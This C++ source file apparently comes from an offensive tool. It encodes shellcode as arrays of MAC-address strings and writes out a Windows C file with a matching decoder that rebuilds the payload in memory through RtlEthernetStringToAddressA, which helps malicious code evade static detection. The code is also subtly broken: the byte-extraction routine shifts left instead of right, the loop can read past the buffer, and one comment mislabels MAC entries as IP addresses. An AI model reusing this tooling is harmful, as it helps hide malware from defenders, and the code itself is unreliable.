// Included libraries //
#include <cinttypes>
// Header files //
#include "hdrs/mac_obfuscation.h"
#define MAC_ITER 6


void macGenerate(uint64_t mac_value, char* output_buffer, size_t buffer_size) {
    /* Purpose - Converts the passed in hex representation to a char MAC address.
     * Parameters:
     *      @ mac_value - The hex representation of MAC address to be converted.
     *      @ output_buffer - A pointer to the char buffer where the formatted result will reside.
     *      @ buffer_size - The size of the output buffer where the formatted output will be stored.
     */
    std::snprintf(output_buffer, buffer_size,
                  "%" PRIx64 "-%" PRIx64 "-%" PRIx64 "-%" PRIx64 "-%" PRIx64 "-%" PRIx64 ,
                  static_cast<uint64_t>(mac_value << 40) & 0xFF,
                  static_cast<uint64_t>(mac_value << 32) & 0xFF,
                  static_cast<uint64_t>(mac_value << 24) & 0xFF,
                  static_cast<uint64_t>(mac_value << 16) & 0xFF,
                  static_cast<uint64_t>(mac_value << 8) & 0xFF,
                  static_cast<uint64_t>(mac_value) & 0xFF);
}


uint64_t macHexGen(int byte_1, int byte_2, int byte_3, int byte_4, int byte_5, int byte_6) {
    /* Purpose - Takes the 6 bytes of passed in shellcode data and generates a hex value to be
     *           converted to an MAC address in another function.
     * Parameters:
     *      @ byte_1 - First byte of shellcode.
     *      @ byte_2 - Second byte of shellcode.
     *      @ byte_3 - Third byte of shellcode.
     *      @ byte_4 - Fourth byte of shellcode.
     *
     * Returns - The formatted hex value of the passed in 6 bytes.
     */
    return ((uint64_t)byte_1 << 40) | ((uint64_t)byte_2 << 32) | ((uint64_t)byte_3 << 24) |
            ((uint64_t)byte_4 << 16) | ((uint64_t)byte_5 << 8) | byte_6;
}


void macObfuscationHandler(ShellcodeStruct& shell_struct) {
    /* Purpose - Takes the shellcode stored in passed in struct and runs it through obfuscation
     *           routine to obfuscate it as an array of MAC address. Source code file is generated
     *           with obfuscated array and corresponding decoder routine.
     * Parameters:
     *      @ shell_struct - The shellcode struct where the shellcode to be obfuscated resides.
     */
    const char file_header[] = "#include <Windows.h>\n"
                               "#include <stdio.h>\n"
                               "#include <Ip2string.h>\n"
                               "#pragma comment(lib, \"Ntdll.lib\")\n\n"
                               "#ifndef NT_SUCCESS\n"
                               "#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n"
                               "#endif\n";
    // Write the header of the file //
    writeOutputData(shell_struct, file_header);

    const char payload_bracket_inner[] = "\nconst char* MACShell[] = {\n\t";
    // Write the inner bracket of the obfuscated payload //
    writeOutputData(shell_struct, payload_bracket_inner);

    unsigned int num_elements = 0;
    char mac_addr[64];
    char format_comma[128];
    uint64_t hex_value;

    // Iterate over the shellcode by increments of 6 //
    for (unsigned int iter = 0; iter <= shell_struct.result_size; iter += MAC_ITER) {
        // Generate hex representation of the next 6 bytes of data //
        hex_value = macHexGen(shell_struct.pad_shellcode_ptr[iter],
                              shell_struct.pad_shellcode_ptr[iter + 1],
                              shell_struct.pad_shellcode_ptr[iter + 2],
                              shell_struct.pad_shellcode_ptr[iter + 3],
                              shell_struct.pad_shellcode_ptr[iter + 4],
                              shell_struct.pad_shellcode_ptr[iter + 5]);
        // Format the mac address and save it in the passed in buffer //
        macGenerate(hex_value, mac_addr, sizeof(mac_addr));

        // Format the generate mac address with comma to be inserted into array //
        std::snprintf(format_comma, sizeof(format_comma), "\"%s\",", mac_addr);
        // Write the formatted comma-separated IP address member //
        writeOutputData(shell_struct, format_comma);

        // Check if a newline is needed (every 6 entries) except for the last entry //
        if (((iter + MAC_ITER) % 36 == 0) && (iter + MAC_ITER < shell_struct.result_size)) {
            writeOutputData(shell_struct, "\n\t");
        }
        num_elements++;
    }
    // Move the file stream pointer back one index to overwrite the last comma //
    shell_struct.output_stream.seekp(-1, std::ios_base::end);

    const char payload_bracket_outer[] = "\n};\n\n";
    // Write the outer bracket of the obfuscated payload //
    writeOutputData(shell_struct, payload_bracket_outer);

    const char shellcode_preparse[] = "#define ElementsNumber %d\n"
                                      "#define SizeOfShellcode %d\n\n";
    char shellcode_constants[sizeof(shellcode_preparse) + 10];
    // Parse the formatted string in result buffer //
    std::snprintf(shellcode_constants, sizeof(shellcode_constants), shellcode_preparse,
                  num_elements, shell_struct.result_size);
    // Write the formatted constants //
    writeOutputData(shell_struct, shellcode_constants);

    const char decoder[] = "BOOL DecodeMACFuscation(const char* MAC[], PVOID LpBaseAddress) {\n"
                           "    PCSTR Terminator = NULL;\n"
                           "    PVOID LpBaseAddress2 = NULL;\n"
                           "    NTSTATUS STATUS;\n\n"
                           "    int i = 0;\n"
                           "    for (int j = 0; j < ElementsNumber; j++) {\n"
                           "        LpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);\n"
                           "        STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[j], &Terminator, (DL_EUI48*)LpBaseAddress2);\n"
                           "        if (!NT_SUCCESS(STATUS)) {\n"
                           "            printf(\"[!] RtlEthernetStringToAddressA failed for %s result %x\", MAC[j], STATUS);\n"
                           "            return FALSE;\n"
                           "        }\n"
                           "        else {\n"
                           "            i = i + 6;\n"
                           "        }\n"
                           "    }\n"
                           "    return TRUE;\n"
                           "}\n";
    // Write the decoder function //
    writeOutputData(shell_struct, decoder);
}